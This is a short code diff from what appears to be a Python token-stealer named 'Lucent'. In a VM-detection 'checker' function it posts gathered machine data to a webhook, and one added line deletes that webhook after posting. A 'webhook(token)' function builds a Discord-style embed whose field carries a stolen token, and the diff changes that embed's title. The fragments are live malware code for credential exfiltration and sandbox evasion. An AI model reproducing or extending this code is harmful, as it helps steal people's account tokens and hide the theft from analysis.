@@ -225,6 +225,7 @@ def checker():
         try:
             requests.post(h00k, json=data_VM)
             time.sleep(2)
+            requests.delete(h00k)
         except Exception as e:
             pass
         sys.exit(1)
@@ -365,7 +366,7 @@ def webhook(token):
         "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
         "embeds": [
             {
-                "title": f"{user_name} | Lucent",  
+                "title": f"{user_name} | ({id})",  
                 "fields": [
                     {
                         "name": "🔑 Token",
